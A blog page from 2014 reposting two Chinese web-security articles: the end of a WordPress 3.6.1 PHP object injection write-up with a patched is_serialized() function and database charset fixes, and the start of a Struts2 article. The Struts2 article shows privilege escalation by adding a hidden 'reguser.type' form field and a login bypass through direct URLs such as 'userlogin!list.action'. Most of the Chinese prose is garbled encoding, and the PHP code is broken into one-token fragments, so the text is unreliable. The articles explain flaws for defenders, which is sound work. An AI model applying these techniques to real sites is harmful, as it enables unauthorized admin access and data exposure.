<p>æ‰€ä»¥æ˜¯ä¸æ˜¯WordPressæ˜¯æœ‰å®‰å…¨éšæ‚£çš„ï¼Œä½†æ˜¯æ— æ³•è¢«åˆ©ç”¨ï¼Ÿä¸ä¸€å®šï¼Œå¦‚æœä½ ç†Ÿæ‚‰WordPressï¼Œä½ å¯èƒ½ä¼šè§‰å¯Ÿåˆ°å¯èƒ½æœ‰ä¸€å †æ’ä»¶å­˜åœ¨æ¼æ´ã€‚è¿™äº›æ’ä»¶æœ‰ä»–ä»¬è‡ªå·±çš„ç±»å¹¶ä¸”å¯èƒ½æš´éœ²å‡ºå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æˆ‘æƒ³åˆ°è¿™ä¸ªåï¼Œå·²ç»å‘ç°äº†ä¸€æ¬¾è‘—åçš„æ’ä»¶å­˜åœ¨æ¼æ´å¹¶ä¸”å¯ä»¥å¯¼è‡´è¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>ç”±äºé“å¾·è€ƒè™‘ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä¸ä¼šå‘å¸ƒPoCçš„ï¼Œæœ‰å¤ªå¤šå­˜åœ¨å®‰å…¨æ¼æ´çš„WordPressäº†ã€‚</p>
<h2 id="0x03-wordpress">0x03 ä¿®å¤WordPress</h2>
<p>è¿™ä¸ªä¿®å¤æ–¹å¼æ˜¯ä¿®æ”¹is_serializedå‡½æ•°ï¼Œæˆ‘ç®€å•çš„è¯´è¯´ï¼š
function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>,</p>
<p>$strict</p>
<p>= true ) {</p>
<p>// å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²å°±ä¸ä¼šæ˜¯åºåˆ—åŒ–åçš„æ•°æ®</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>1 ];</li>
</ul>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>//ç¡®è®¤å­˜åœ¨;æˆ–}ä½†ä¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p>if</p>
<p>(</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;;&#39;</p>
<p>) &lt; 3 &amp;&amp;</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;}&#39;</p>
<p>) &lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>2 ] )</li>
</ul>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>elseif</p>
<p>( false ===</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;&quot;&#39;</p>
<p>) ) {</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>$end</p>
<p>=</p>
<p>$strict</p>
<p>?</p>
<p>&#39;$&#39;</p>
<p>:</p>
<p>&#39;&#39;</p>
<p>;</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;$end/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>è¿™ä¸»è¦çš„åŒºåˆ«æ˜¯å½“$strictå‚æ•°è®¾ç½®ä¸ºfalseçš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€äº›å¼ºåˆ¶æ“ä½œå¯¼è‡´ä¸€ä¸ªå­—ç¬¦ä¸²è¢«æ ‡è®°ä¸ºå·²åºåˆ—åŒ–ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸éœ€è¦å¿…é¡»æ˜¯;æˆ–è€…{ï¼ˆè¯‘è€…æ³¨ï¼šä½œè€…æ­¤å¤„åº”è¯¥ç¬”è¯¯äº†ï¼Œåº”è¯¥æ˜¯;æˆ–è€…}),ä¿®å¤äº†æˆ‘æ‰€æäº¤çš„æ¼æ´ã€‚ç°åœ¨å¤§å®¶æœ‰æ²¡æœ‰ç›¸ä¼¼çš„å†…å®¹å¯ä»¥æ‹¿å‡ºæ¥åšä¸ªè®¨è®ºçš„ï¼Ÿ</p>
<p>WordPressä¾æ—§ä½¿ç”¨ç€ä¸å®‰å…¨çš„unserialize()è€Œéå®‰å…¨çš„json_decodeã€‚å®ƒçš„å®‰å…¨æ€§å…¨åœ¨åˆ¤æ–­è§„åˆ™æˆ–è€…Mysqlçš„è§„åˆ™å®ç°ä¸Šã€‚æˆ‘åœ¨ä¸Šé¢æ­éœ²çš„æ¼æ´å®é™…ä¸Šæ˜¯ä½¿ç”¨Mysqlçš„è§„åˆ™å»æ‰æˆ‘è·Ÿåœ¨ç‰¹æ®Šç¬¦å·åçš„æ‰€æœ‰å­—ç¬¦ã€‚</p>
<p>æœ‰ä¸€ä¸ªå¾ˆç®€æ´çš„ä¿®å¤æ–¹æ¡ˆï¼Œä¿®æ”¹ä¸€ä¸‹æ•°æ®åº“ç¼–ç ä¸è¢«æˆªæ–­å°±å¥½ï¼š
ALTER TABLE wp_commentmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_postmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_usermeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/PHP-WordPress/">PHP-WordPress</a></li></span></span> | <span class="tags">Tagged <a href="/tags/PHP-WordPress/" class="label label-primary">PHP-WordPress</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-29 14:51:25"datetime="2014-03-29 14:51:25"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·/">Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T09:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-Java--Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="struts2-">Struts2æ¡†æ¶å®‰å…¨ç¼ºé™·</h3>
<p>By kxlzx</p>
<h3 id="-">æ‘˜è¦</h3>
<p>æœ¬æ–‡ä»‹ç»äº†javaå¼€å‘æµè¡Œæ¡†æ¶struts2ä»¥åŠwebworkçš„ä¸€äº›å®‰å…¨ç¼ºé™·ï¼Œå¹¶ä¸¾ä¾‹è¯´æ˜æ¡†æ¶æœ¬èº«ä»¥åŠå¼€å‘äººå‘˜ä½¿ç”¨ æ¡†æ¶æ—¶ï¼Œæ‰€äº§ç”Ÿçš„ç§ç§å®‰å…¨é—®é¢˜ï¼Œä»¥åŠä½œè€…æŒ–æ˜æ¡†æ¶å®‰å…¨æ¼æ´çš„ä¸€äº›å¿ƒå¾—ä½“ä¼šã€‚</p>
<h3 id="-">æ¨èä»¥ä¸‹äººç¾¤é˜…è¯»</h3>
<p>äº†è§£javaå¼€å‘ äº†è§£æ¡†æ¶å¼€å‘ äº†è§£web applicationå®‰å…¨ â€œç½‘ç»œå®‰å…¨çˆ±å¥½è€…â€</p>
<h3 id="-">æ­£æ–‡</h3>
<p>å½“å‰javaå¼€å‘ç½‘ç«™ï¼Œé€šå¸¸ä¸ä¼šæ˜¯çº¯JSPçš„ï¼Œå¤§éƒ½ä½¿ç”¨äº†java frameworkã€‚ æœ‰äº†è¿™äº›frameworkï¼Œè®©å¼€å‘äººå‘˜æ›´åŠ å¿«é€Ÿçš„å¼€å‘å‡ºä»£ç ï¼Œä¹Ÿè®©ä»£ç éå¸¸å…·æœ‰å¯æ‰©å±•æ€§ï¼Œé‚£äº›åˆ†å±‚æ¶æ„çš„æ€æƒ³ï¼Œ æ›´æ˜¯æ·±å…¥äººå¿ƒã€‚è¿™äº›ä¹Ÿå¤§å¤§å½±å“äº†å®‰å…¨ä»£ç å®¡æ ¸ï¼Œæ›¾æå‡ºâ€œåˆ†å±‚å®¡æ ¸ä»£ç â€çš„æ€æƒ³ï¼Œæ¯”å¦‚åœ¨DAOå±‚ä¸“é—¨æ£€æŸ¥ sqlæ³¨å…¥ï¼Œåœ¨viewå±‚æ£€æŸ¥xssç­‰ã€‚è¿™äº›æ¡†æ¶éƒ½æœ‰è‡ªå·±çš„å±‚çº§ï¼Œæœ¬æ¬¡æ–‡ç« ä¸»è¦è®²çš„æ˜¯strutsè¿™ä¸ªæ¡†æ¶çš„ç›¸å…³ å®‰å…¨é—®é¢˜ï¼Œä¹Ÿä¼šæœ‰å°éƒ¨åˆ†æ¶‰åŠåˆ°strutsåé¢çš„DAOå±‚ã€‚ è€Œstrutsè¿™ä¸ªæ¡†æ¶æ›´æ–°å æœ‰å¸‚åœºä»½é¢æå¤§çš„ä¸€ä¸ªæ¡†æ¶ï¼Œå®ƒåœ¨å„ä¸ªå±‚çº§ä¸­ï¼Œä½äºå¦‚å›¾æ‰€ç¤ºä½ç½®ï¼š <img src="" alt=""> å¯ä»¥çœ‹åˆ°strutsåœ¨webåº”ç”¨ä¸­ï¼Œè´Ÿè´£å¤„ç†æ¥æ”¶ç”¨æˆ·æ•°æ®ï¼Œè°ƒç”¨ä¸šåŠ¡å¤„ç†ï¼Œä»¥åŠå±•ç¤ºæ•°æ®çš„å·¥ä½œã€‚æ‰€ä»¥æœ¬æ–‡æŠŠ strutsçš„åŠŸèƒ½åˆ†ä¸ºcontrollerå±‚å’Œviewå±‚ï¼Œcontrollerå±‚æ¥å®Œæˆæ¥æ”¶ç”¨æˆ·æ•°æ®ï¼Œåˆ†å‘ç”¨æˆ·è¯·æ±‚ï¼Œè€Œviewä¸“é—¨ ç”¨äºå±•ç¤ºæ•°æ®ã€‚ ä¸€ä¸ªå•ç‹¬çš„strutsï¼Œæ˜¯ä¸åˆé€»è¾‘çš„ï¼Œå› ä¸ºæ¶æ„å¸ˆé€šå¸¸å–œæ¬¢å¤šç§æ¡†æ¶é›†åˆï¼Œè®©å®ƒä»¬å„è‡ªè´Ÿè´£æŸä¸€å±‚çš„å¤„ç†ã€‚ ç ”ç©¶ä¸€ä¸ªæ¡†æ¶çš„å®‰å…¨é—®é¢˜ï¼Œä¸èƒ½ä»…ä»…ç«™åœ¨æ¡†æ¶çš„è§’åº¦ï¼Œè¿˜åº”è¯¥å……åˆ†è€ƒè™‘åˆ°å¼€å‘äººå‘˜æ˜¯å¦‚ä½•ä½¿ç”¨è¿™äº›æ¡†æ¶çš„ï¼Œ ä»–ä»¬æœ€å–œæ¬¢å†™ä»€ä¹ˆæ ·çš„ä»£ç ï¼Œè¿™æ ·æ‰èƒ½è¿˜åŸä¸€ä¸ªæ­£å¸¸çš„ã€å®Œæ•´çš„webåº”ç”¨åœºæ™¯ã€‚ ä»æœç´¢ç»“æœçœ‹ï¼Œäº’è”ç½‘ä¸­ï¼Œç»å¤§å¤šæ•°æ•™ç¨‹æ¨èstruts+hibernate+springè¿™æ ·çš„é»„é‡‘ç»„åˆï¼Œé‚£ä¹ˆï¼Œæˆ‘å‡è®¾æœ‰ ä¸€ä¸ªåº”ç”¨ä½¿ç”¨äº†è¿™ä¸ªç»„åˆï¼Œä»¥strutsä¸ºé‡ç‚¹ï¼Œç«™åœ¨æ”»å‡»è€…çš„è§’åº¦ï¼Œå±‚å±‚åˆ†æstrutsçš„è®¾è®¡ç¼ºé™·ã€‚</p>
<h3 id="struts2-">Struts2å¼€å‘å›é¡¾ä¸ç®€å•å­¦ä¹ </h3>
<p>ä¸ºäº†è®©å¤§å®¶å›é¡¾æˆ–è€…å­¦ä¹ ä¸€ä¸‹struts2ï¼Œæˆ‘ä»¬ä¸€èµ·æ¥å»ºç«‹ä¸€ä¸ªactionã€jspé¡µé¢ï¼Œåšä¸€ä¸ªæ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œä¹‹å å¤„ç†ä¸€ä¸‹ï¼Œå†å±•ç¤ºå‡ºæ¥ç»™ç”¨æˆ·çš„è¿‡ç¨‹ï¼Œç²¾é€šstruts2çš„åŒå­¦å¯ä»¥è·³è¿‡æ­¤æ­¥ã€‚ -------------------------------------strutså›é¡¾start é¦–å…ˆå»ºç«‹actionï¼Œå«åšAaaaActionï¼š public class AaaaAction extends ActionSupport{ private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } public String execute(){ System.out.println(&quot;exe&quot;); return SUCCESS; } public String bbb(){ System.out.println(&quot;bbbbb&quot;); return SUCCESS; } } è¯·æ³¨æ„executeè¿™ä¸ªæ–¹æ³•ï¼Œè®©ç”¨æˆ·è¾“å…¥actionçš„åœ°å€åï¼Œé»˜è®¤ä¼šè®¿é—®è¿™ä¸ªæ–¹æ³•ã€‚ ä¹‹åé…ç½®struts.xmlæ–‡ä»¶ <action name="aaaaaaa" class="net.inbreak.AaaaAction"> <result name="success">user/aaa.jsp</result> </action> é…ç½®è¿™ä¸ªæ–‡ä»¶åï¼Œå½“ç”¨æˆ·è¾“å…¥ <a href="http://www.inbreak.net/app/aaaaaaa.action">http://www.inbreak.net/app/aaaaaaa.action</a> çš„æ—¶å€™ï¼Œstrutsä¼šè´Ÿè´£è®©AaaaActionä¸­çš„executeæ–¹æ³•å¤„ç†ç”¨æˆ·è¯·æ±‚ã€‚ å¤„ç†ä¹‹åï¼Œè¯¥æ–¹æ³•è¿”å›â€œreturn SUCCESS;â€ï¼Œstrutsåˆè´Ÿè´£æ‰¾åˆ°resultçš„nameæ˜¯seccuessæ‰€æŒ‡å‘çš„jspé¡µé¢ã€‚ æŠŠè¯¥é¡µé¢è§£æåï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚ è€Œç”¨æˆ·çœ‹åˆ°çš„å°±æ˜¯aaa.jspé¡µé¢çš„htmlä»£ç ã€‚ struts2ç»§æ‰¿äº†webworkçš„æ‰€æœ‰ä¼˜ç‚¹ï¼Œå…¶å®ç­‰äºæ˜¯webworkçš„å‡çº§ï¼Œå¦‚æœå¼€å‘äººå‘˜æƒ³è®©ç”¨æˆ·ç›´æ¥è®¿é—®actionä¸­çš„ æŸæ–¹æ³•ï¼Œè€Œä¸æ˜¯è®¿é—®é»˜è®¤çš„executeæ–¹æ³•ï¼Œåªè¦å®šä¹‰ä¸€ä¸ªæ–¹æ³•å«åšbbbï¼Œå¹¶ä¸”æ˜¯publicçš„ï¼Œç”¨æˆ·å°±å¯ä»¥ç›´æ¥è¾“å…¥ <a href="http://www.inbreak.net/app/aaaaaaa!bbb.action" target="_blank">http://www.inbreak.net/app/aaaaaaa!bbb.action</a> ç›´æ¥è®¿é—®äº†bbbæ–¹æ³•ã€‚ é‚£requestä¸­çš„å‚æ•°å¦‚æœæ¥æ”¶å‘¢ï¼Ÿstruts2ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«åŒ…è£…äº†èµ·æ¥ï¼Œä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼Œåªè¦åœ¨actionä¸­å®šä¹‰ ä¸€ä¸ªå±æ€§ï¼Œå«åšpublic String nameï¼›ã€‚ç„¶ååŠ å…¥getNameå’ŒsetNameæ–¹æ³•ï¼Œå°±å¯ä»¥åƒæ­£å¸¸ä½¿ç”¨å±æ€§ä¸€æ ·ï¼Œæ¥æ”¶åˆ° ç”¨æˆ·ä¼ é€’è¿‡æ¥çš„å˜é‡ã€‚æ— è®ºæ˜¯getè¯·æ±‚è¿˜æ˜¯postè¯·æ±‚ï¼Œéƒ½å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼æ¥æ”¶ç”¨æˆ·è¾“å…¥ã€‚ æ•´ä¸ªè¿‡ç¨‹å°±å¦‚æ­¤ç®€å•ï¼Œç°åœ¨å¤§å®¶å¯¹æµç¨‹æœ‰äº†äº†è§£ï¼Œæˆ‘ä»¬å°±å¼€å§‹è®¨è®ºæ­£æ–‡ï¼Œå¦‚æœè¿˜æ˜¯æƒ³äº†è§£æ›´å¤šï¼Œè¯·è‡ªè¡Œgoogleã€‚ ----------------------------------strutså›é¡¾end</p>
<h3 id="struts2-">Struts2å®‰å…¨ç¼ºé™·</h3>
<p>å¯ä»¥çœ‹åˆ°struts2åœ¨æ•°æ®æµå‘æ–¹é¢ï¼Œæœ‰ä¸¤ä¸ªé‡ç‚¹ï¼Œä¸€ä¸ªæ˜¯è¿›å…¥ï¼ˆinï¼‰ï¼Œä¸€ä¸ªæ˜¯è¾“å‡ºï¼ˆoutï¼‰ã€‚è€Œæˆ‘åœ¨åšæ¼æ´ æŒ–æ˜çš„æ€è·¯ï¼Œä¹Ÿæ˜¯è·Ÿç€è¿™ä¸ªæ•°æ®çš„æµç¨‹ï¼Œå¼€å§‹åˆ†æçš„ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹è®©æ•°æ®è¿›å…¥ã€‚ Actionå±æ€§é»˜è®¤å€¼å¯ä»¥è¢«è¦†ç›–ç¼ºé™·ï¼š åœ¨æ—¥å¸¸çš„javaé¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¿å­˜ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼ˆæ¯”å¦‚æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼‰ï¼Œç„¶åç»™è¿™ä¸ªå¯¹è±¡èµ‹äºˆä¸€äº› ç”¨æˆ·æäº¤ä¸Šæ¥çš„å±æ€§å€¼ï¼Œåœ¨è¿™é‡Œï¼Œåªéœ€è¦å®šä¹‰ä¸€ä¸ªå¯¹è±¡ç±»ï¼š public class User { private Long id=0l; private String name; private String pass; private Integer type=1; ã€‚ã€‚ã€‚ä¸‹é¢çš„getå’Œsetæ–¹æ³•ä»£ç ç•¥ } å®šä¹‰åï¼Œåœ¨actionä¸­ï¼Œæ·»åŠ ä¸€ä¸ªå±æ€§ User reguser; ç”¨æˆ·æ³¨å†Œçš„é¡µé¢ä»£ç å¦‚ä¸‹ï¼š <form XXXXXXX> <input name="reguser.name"> å½“ç”¨æˆ·æäº¤è¿™ä¸ªformåˆ°actionä¸­åï¼Œstruts2ä¼šè´Ÿè´£è‡ªåŠ¨æ˜ å°„reguser.nameçš„å€¼åˆ°reguserçš„ç›¸å…³å±æ€§ï¼ˆnameï¼‰ ä¸­ï¼Œæ‰€ä»¥åœ¨executeè¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå°±å¯ä»¥ä½¿ç”¨reguser.getName()æ‹¿åˆ°ç”¨æˆ·æäº¤çš„reguser.nameçš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬ ä¸‹é¢çš„ä»£ç å°±å¾ˆç®€å•äº†ï¼š public String execute(){ add(user); addæ–¹æ³•ï¼Œæ›´ç®€å•äº†ï¼Œå› ä¸ºæˆ‘ä»¬é¡¹ç›®ä¸­é›†æˆäº†hibernateï¼Œè¿™ä¸ªæ¡†æ¶è‡ªåŠ¨æ˜ å°„userç±»ä¸­çš„å„ä¸ªå±æ€§ï¼Œè‡ªåŠ¨ç»„æˆ insertè¯­å¥ã€‚æˆ‘ä»¬åªè¦åœ¨addä¸­è°ƒç”¨session.save(user);å°±å¯ä»¥ä¿å­˜ç”¨æˆ·åˆ°æ•°æ®åº“ä¸­ã€‚ å‰æ–‡æåˆ°é‚£ä¹ˆå¤šâ€œç®€å•â€ä¸¤ä¸ªå­—ï¼Œéš¾é“è¿™äº›è¿‡ç¨‹éƒ½æ˜¯å®‰å…¨çš„è€Œä»–ç»™æˆ‘ä»¬ä»…ä»…å¸¦æ¥äº†æ–¹ä¾¿ä¹ˆï¼Ÿ struts2åªè´Ÿè´£æ˜ å°„æ‰€æœ‰å¯¹è±¡ï¼Œä»–æä¾›äº†forméªŒè¯ï¼Œä¹Ÿåªèƒ½éªŒè¯formä¸­å±æ€§å€¼çš„å†…å®¹ï¼Œæ¯”å¦‚emailæ ¼å¼ç­‰ï¼Œ å¹¶ä¸èƒ½çº¦æŸç”¨æˆ·æäº¤å…¶ä»–å±æ€§ä¸Šæ¥ï¼Œäºæ˜¯è¿™å°±å˜æˆäº†ååˆ†å±é™©çš„åŠŸèƒ½ã€‚ å½“Userä¸­æœ‰ä¸ªå±æ€§typeï¼Œä»£è¡¨Useræ˜¯å¦ç®¡ç†å‘˜æ—¶ï¼ˆ1ä¸ºæ™®é€šç”¨æˆ·ï¼Œ2ä¸ºç®¡ç†å‘˜ï¼‰ï¼Œéº»çƒ¦æ¥äº†ï¼Œæ”»å‡»è€…åœ¨åŸæ¥çš„ æ³¨å†Œè¡¨å•ä¸­ï¼Œæ–°åŠ å…¥ä¸€ä¸ªinputï¼Œå«åš <input name="reguser.type"> ç„¶åè¾“å…¥å€¼æ˜¯2ï¼ŒæŠŠè¿™ä¸ªå€¼ä¸€èµ·äº¤ç»™actionã€‚åœ¨è¿™ä¸ªæµç¨‹ä¸­ï¼Œè¿™ä¸ªå€¼ï¼Œå½“ç„¶ä¹Ÿä¼šè¢«è‡ªåŠ¨å¸¦åˆ°æ•°æ®åº“ä¸­ï¼Œå‘ä¸‹ å¤„ç†çš„é€»è¾‘ä¸­ï¼Œè¿™ä¸ªç”¨æˆ·ï¼Œå°±å·²ç»å˜æˆç®¡ç†å‘˜äº†ã€‚ å½“ä½ çœ‹åˆ°äº†ä¸€ä¸ªstruts2æˆ–è€…webworkçš„åº”ç”¨ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨å±æ€§æ”»å‡»ï¼Œä¿®æ”¹å½“å‰è¡¨å•ï¼Œé‡Œé¢æœ‰æ‰€æœ‰ä½ çŒœæµ‹åˆ° çš„å±æ€§ï¼Œä¸€å¹¶æäº¤ä¸Šæ¥ï¼Œå°±å¯èƒ½ä¼šå½±å“æ•´ä¸ªé€»è¾‘ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚æ–‡ä¸­ä»…ä»…æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œäº‹å®ä¸Šï¼Œåœ¨æ•°æ®ä¼ é€’ çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ä»»æ„è¦†ç›–æ•°æ®çš„é»˜è®¤å€¼ï¼Œæœ¬æ¥å°±æ˜¯ä¸€ä¸ªå±é™©çš„ç¼ºé™·ï¼Œè€Œstruts2å’Œwebworkè¿™ä¸¤ä¸ªæ¡†æ¶ä»…ä»…çœ‹åˆ° äº†å®ƒå¸¦æ¥çš„å¥½å¤„ï¼Œå¿½ç•¥äº†è¿™æ–¹é¢åŸºäºå®‰å…¨æ€§çš„è€ƒè™‘ï¼Œä»…ä»…å…³æ³¨äº†ç”¨æˆ·æäº¤æ•°æ®çš„æ­£ç¡®æ€§ã€‚å¯¹æ¯”åœ¨æ²¡æœ‰struts2 è¿™ä¸ªåŠŸèƒ½çš„æ—¶å€™ï¼Œæˆ‘ä»¬å´éœ€è¦åœ¨actionä¸­ä¸€ä¸ªä¸€ä¸ªçš„æŠŠéœ€è¦çš„å˜é‡ï¼Œä»ç”¨æˆ·æäº¤çš„requestä¸­è§£å‡ºæ¥ï¼Œä¸€ä¸ªä¸€ä¸ª å¤„ç†ï¼Œä¸å¯èƒ½å‡ºç°è¿™ç§å®‰å…¨é—®é¢˜ã€‚ç°åœ¨å®ƒåŒ…è£…äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œè‡ªä»¥ä¸ºå¾ˆæ–¹é¢ï¼Œå´å‡ºäº†ä¸¥é‡é—®é¢˜ã€‚</p>
<h3 id="action-">Actionä¸­çš„æ–¹æ³•è¢«æš´åŠ›çŒœè§£ç¼ºé™·</h3>
<p>å‰æ–‡æåˆ°ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è®©ç”¨æˆ·è®¿é—®actionæ—¶ï¼Œä¸è®¿é—®é»˜è®¤çš„executeæ–¹æ³•ï¼Œè€Œæ˜¯ç›´æ¥è®¿é—®å…¶ä»–actionä¸­ çš„æ–¹æ³•ï¼Œæ¡ä»¶æ˜¯åœ¨actionä¸­ï¼Œå†™ä¸€ä¸ªpublicçš„æ–¹æ³•ã€‚å¼€å‘äººå‘˜å¦‚æœéœ€è¦åšä¸€ä¸ªç™»é™†åï¼Œå±•ç¤ºæ‰€æœ‰ç”¨æˆ·åˆ—è¡¨çš„ åŠŸèƒ½ï¼Œè€Œä»–çš„ä¸€ä¸ªâ€œè§£è€¦åˆâ€çš„å¼€å‘ä¹ æƒ¯ï¼Œå°†åœ¨è¿™é‡Œå¯¼è‡´å®‰å…¨ç¼ºé™·ã€‚ å®šä¹‰ä¸€ä¸ªå¦‚ä¸‹çš„action public class Userlogin extends ActionSupport{ private String uname=&quot;&quot;; private String upwd; private List list; //getter and setter æ–¹æ³•ç•¥ public String login(){ if(uname!=null&amp;&amp;upwd!=null&amp;&amp;uname.equals(&quot;kxlzx&quot;)&amp;&amp;upwd.equals(&quot;pass&quot;)) {//if login success return list(); } return false; } public String list(){ list.add(&quot;kxlzx&quot;);list.add(&quot;kxlzx1&quot;);list.add(&quot;kxlzx2&quot;);list.add(&quot;kxlzx3&quot;); return &quot;list&quot;; } } Userloginä¸­ï¼Œå› ä¸ºlistè¿™ä¸ªåŠŸèƒ½ï¼ˆæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·åˆ—è¡¨ï¼‰ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé€šç”¨çš„åŠŸèƒ½ï¼Œå¾ˆå®¹æ˜“è¢«å…¶ä»–åœ°æ–¹è°ƒç”¨ï¼Œ æ‰€ä»¥å¼€å‘äººå‘˜æŠŠå®ƒå•ç‹¬å†™æˆäº†ä¸€ä¸ªæ–¹æ³•ã€‚ å½“ç”¨æˆ·ç™»é™†çš„æ—¶å€™ï¼Œæ‰“å¼€ <a href="http://www.inbreak.net/app/userlogin!login.action" target="_blank">http://www.inbreak.net/app/userlogin!login.action</a> æ¥åˆ°äº†ç”¨æˆ·çš„ç™»é™†é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰ç”¨æˆ·è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰èƒ½æœ€ç»ˆè°ƒç”¨list()æ–¹æ³•ï¼Œæ˜¾ç¤ºç»“æœã€‚ <img src="" alt=""> ä½†æ˜¯struts2æŠŠæ‰€æœ‰publicçš„æ–¹æ³•éƒ½æš´éœ²äº†å‡ºå»ï¼Œå¯¼è‡´ç°åœ¨ç”¨æˆ·è¾“å…¥äº† <a href="http://www.inbreak.net/app/userlogin!list.action" target="_blank">http://www.inbreak.net/app/userlogin!list.action</a> ç”¨æˆ·è®¿é—®è¿™ä¸ªé“¾æ¥åï¼Œstruts2è°ƒç”¨listæ–¹æ³•ï¼Œç„¶åè¿”å›ç»“æœç»™ç”¨æˆ·ï¼Œæ‰€ä»¥æ²¡æœ‰ç™»é™†ï¼Œå°±æ˜¾ç¤ºäº†æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œ ç›´æ¥ç»•è¿‡äº†loginä¸­çš„ç™»é™†éªŒè¯ã€‚ <img src="" alt=""> 